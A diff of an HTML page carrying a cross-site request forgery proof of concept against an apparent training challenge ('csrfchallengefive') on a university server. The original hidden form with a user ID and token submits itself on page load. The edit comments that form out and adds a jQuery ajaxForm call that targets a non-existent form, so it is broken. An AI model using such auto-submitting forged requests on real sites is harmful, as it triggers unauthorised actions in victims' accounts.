@@ -1,8 +1,23 @@
+<!DOCTYPE html>
+<!--
+<script src="https://ajax.googleapis.com/ajax/libs/jquery/2.1.3/jquery.min.js"></script>
 <form name="csrfForm" action="https://snickerboa.it.liu.se/user/csrfchallengefive/plusplus" method="POST">
 <input type="hidden" name="userId" value="09b532b01c801fd7c25b83fad47c7e8df894b588" />
 <input type="hidden" name="csrfToken" value="75928336271529089346409579781883273376" />
 <input type="submit"/>
 </form>
+-->
 <script>
-document.csrfForm.submit();
+// document.csrfForm.submit();
+$('#myForm')
+    .ajaxForm({
+        url : 'https://snickerboa.it.liu.se/',
+        data : {
+            userId: "09b532b01c801fd7c25b83fad47c7e8df894b588"
+        },
+        success : function (response) {
+            alert("The server says: " + response);
+        }
+    })
+;
 </script>
